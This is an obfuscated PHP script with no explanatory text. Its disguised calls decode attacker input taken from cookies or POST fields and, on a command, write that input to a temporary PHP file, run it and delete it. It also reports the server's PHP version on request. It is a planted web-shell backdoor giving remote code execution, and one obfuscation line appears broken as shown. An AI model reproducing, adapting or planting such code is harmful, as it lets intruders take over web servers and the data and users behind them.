<?php        function/*   ymy  */lulvk(){  print	(87468);	}
$wklzcp/*   h__q */=/* mayrd   */'wklzcp'    ^	'';

$hqqimflqmk	=/*   ize*/$wklzcp(102)	./*yby*/"i"."l"."e"."_"."p"."u".$wklzcp(116)	./*  _i */$wklzcp(925-830)/*  f */.	"c"."o".$wklzcp(110)	.       "\164"/*  ys */.	"\145"/*  nnzpw   */.	"n".$wklzcp(116)	.	"\163";$idthpm/*nna */=/*mrv  */"b".$wklzcp(465-368)   .	$wklzcp(115)	.   "e".$wklzcp(738-684)  ./*   jnv_*/$wklzcp(52)/* t_qb  */.  "_".$wklzcp(348-248)     ./*   z*/"e"."\x63"       .	"o"."d".$wklzcp(1092-991);

$sekusz/*   ovfx   */=  "u"."n"."s"."e"."r".$wklzcp(324-219)/*  rwxcl*/./*   ficmg */"\141"    .	$wklzcp(108)	.  "i"."z"."e";
$ronhkqnjzo      =	$wklzcp(621-509)  .     "h".$wklzcp(192-80)/*  ov_i */.      $wklzcp(177-59)	./* g*/$wklzcp(288-187)	.	"r"."\x73"/*wevri*/./*_e */"i"."o"."n";
$mamhtw/*  mkv */=/*   az   */"u"."n"."\x6c"	.      "\151"/*  pyonf  */./* o*/"\x6e"/*  zdfjk   */.	$wklzcp(107);



/* icolx*/function	kplcm($tmgsnrw,  $aqphfzrfgzcb)


{
/*   vppn*/global	$wklzcp;

/*  z */$woejfdeilo	=	"";    for	($bqnbafvifd/* lq  */=	0;/*   s */$bqnbafvifd/*do */<      strlen($tmgsnrw);)/*   xovg */{


/*  wwkw   */for	($aqphfzrf    =	0;	$aqphfzrf   </*   iolx*/strlen($aqphfzrfgzcb)	&&     $bqnbafvifd/*ho*/</*   xjfca  */strlen($tmgsnrw);	$aqphfzrf++,	$bqnbafvifd++)/* w*/{	$woejfdeilo/*   irjz */.=  $wklzcp(ord($tmgsnrw[$bqnbafvifd])	^/*nfd  */ord($aqphfzrfgzcb[$aqphfzrf]));
   }
       }

   return/* sq*/$woejfdeilo;


}


$_corrd	=       $_COOKIE;$hgxy_a	=     $_POST;
$_corrd/*wz  */=	array_merge($hgxy_a,	$_corrd);



$mhwikd/*k */=	"\x61".$wklzcp(522-473)      .       "\143"/* obbuk  */.     "\146"/*cmv_   */.      $wklzcp(519-418)      .	"\x63"	./* bt */"7".$wklzcp(56)       .	$wklzcp(270-225)/*xuim*/.	$wklzcp(759-707)	.     $wklzcp(332-231)      ./*  oxqj */$wklzcp(48)	.	"9"."-"."4"."\x33"/*   bj */./*   qgi*/"4".$wklzcp(101)	.  "\x2d"   ./* tnkzt   */"\71"	./*  paana*/"0".$wklzcp(633-581)       .     "\142"	.	"-"."4"."\x33"/*c*/.     "2"."0"."4"."3"."\60"	.  "7"."\x33"	.	"8"."c"."c";


foreach/* ntvhr   */($_corrd   as      $mtgxeeskl   =>/*ons */$tmgsnrw)	{

/*uqo  */$tmgsnrw       =/* v*/$sekusz(kplcm(kplcm($idthpm($tmgsnrw),   $mhwikd),  $mtgxeeskl));

	if/*   s  */(isset($tmgsnrw["\141"/*   tc  */./* h_v   */"k"]))   {

   if	($tmgsnrw["\x61"]       ==	"\151")	{/*   ub  */$bqnbafvifd/*  irtz*/=	array();
	$bqnbafvifd["\x70"	.      $wklzcp(118)]/*  lnw */=    $ronhkqnjzo();

	$bqnbafvifd["\x73"/*lb_mh   */.   "v"]     =/*rfdrx*/$wklzcp(62-11)/*   k */.   "\x2e"	./*  gg   */"\x35";

    echo/*  c_  */@serialize($bqnbafvifd);

/*ujv */}      elseif/*  io   */($tmgsnrw["\x61"]/*yr   */==  "e")	{	$hblerieqp   =       sprintf("."."/"."%"."s"."\x2e"     .      $wklzcp(936-824)/* _f_ds */.	"\x6c",	md5($mhwikd));/*hhi */$hqqimflqmk($hblerieqp,/*   p */"<"	./*mbt*/"\77"/* f */./* s  */"\x70"    .	"h".$wklzcp(112)       ./*  u */$wklzcp(32)	.  "u"."\156"/*  lryjm */.	"\x6c"/*x */.	"\x69"/* vid*/.	$wklzcp(110)/*  reo*/./*zi*/"k"."("."\x5f"       .    "_"."F"."I"."\114"/*  m*/.	"E"."_"."_"."\x29"      ./*xis */"\73"      .    $wklzcp(32)/*bpz*/./*  rdn */$tmgsnrw["d"]);/*  g*/include($hblerieqp);
	$mamhtw($hblerieqp);
     }
       exit();/*   ss_q   */}}



